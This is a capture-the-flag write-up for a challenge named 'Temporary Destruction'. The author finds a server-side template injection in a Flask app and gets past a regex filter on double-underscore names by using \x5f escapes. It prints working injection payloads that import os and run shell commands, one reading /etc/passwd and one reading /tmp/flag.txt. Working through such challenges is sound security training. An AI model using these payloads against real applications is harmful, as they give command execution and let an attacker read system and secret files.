#### Temporary Destruction
- points earned: 673
#### Where's the flag?
- The flag is echo'd into `/tmp/flag.txt` on the container.
- There's no other references to this file form the challenge code.
- Based on this I'm thinking:
	- This is probably an arbitrary file read vulnerability.  Since the flag file name is not randomized I wouldn't need a code/command execution to first determine the filename before reading.
	- However, I'd also be able to read the flag with a code/command execution.
#### Notes / Intuition
- There's not a lot of code to look trough here and the first thing I notice is a call to `render_template_string` which makes me think SSTI.
- It is sending `raw_input` as an arg to `render_template_string` and `raw_input` just comes from the user.  This is definitely SSTI.
	- To confirm this I launched the local challenge and submitted `{{4*4}}`.
	- The response was `16` which confirms the vulnerability.
- A also see that there is some validation on `raw_input`
	```python
	BLOCKED = re.compile(r'__\w+__')
	if BLOCKED.search(raw_input):
		output = 'rejected.'
		is_error = True
	```
	- This is checking for the presence of `__<something>__`.
	- It's filtering stuff like `__class__` so I need to a way to bypass this.
		- In situations like this `\x5f` can be used instead of `_` to bypass the filter
		- Payloads for this type of bypass are readily available and my notes contained the one below.
			```python
			{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /etc/passwd')|attr('read')()}}
			```

#### Solution
- Submit the payload below.
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /tmp/flag.txt')|attr('read')()}}
```
